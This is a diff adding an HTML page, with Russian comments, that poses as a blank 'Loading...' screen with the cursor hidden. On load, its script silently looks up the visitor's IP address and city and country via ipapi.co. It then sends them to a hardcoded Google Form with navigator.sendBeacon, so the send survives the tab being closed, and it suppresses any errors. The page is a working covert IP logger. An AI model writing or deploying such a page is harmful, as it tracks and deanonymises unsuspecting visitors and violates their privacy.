@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <style>
+        /* Полностью черный экран и отсутствие курсора */
+        body {
+            background-color: black;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            width: 100vw;
+            cursor: none;
+            overflow: hidden;
+        }
+    </style>
+</head>
+<body>
+
+<script>
+    async function collectData() {
+        try {
+            // 1. Получаем данные об IP и локации
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+
+            const ip = data.ip || "Не определен";
+            const location = `${data.city || '?'}, ${data.country_name || '?'}`;
+
+            // 2. Формируем скрытую ссылку для отправки в твою форму
+            const formId = "1FAIpQLSe6BXqCx4uuftFIBPGxo5i0pXg7FzpaRCVB4cGZQYXYJV5P3A";
+            const entryIp = "entry.295293350";
+            const entryLoc = "entry.86385909";
+
+            const postUrl = `https://docs.google.com/forms/d/e/${formId}/formResponse?` + 
+                            `${entryIp}=${encodeURIComponent(ip)}&` + 
+                            `${entryLoc}=${encodeURIComponent(location)}&` + 
+                            `submit=Submit`;
+
+            // 3. Отправляем данные (метод Beacon работает даже если вкладку сразу закроют)
+            navigator.sendBeacon(postUrl);
+
+        } catch (e) {
+            // Если что-то пошло не так (например, VPN), скрипт просто промолчит
+        }
+    }
+
+    // Запуск при открытии
+    collectData();
+</script>
+
+</body>
+</html>
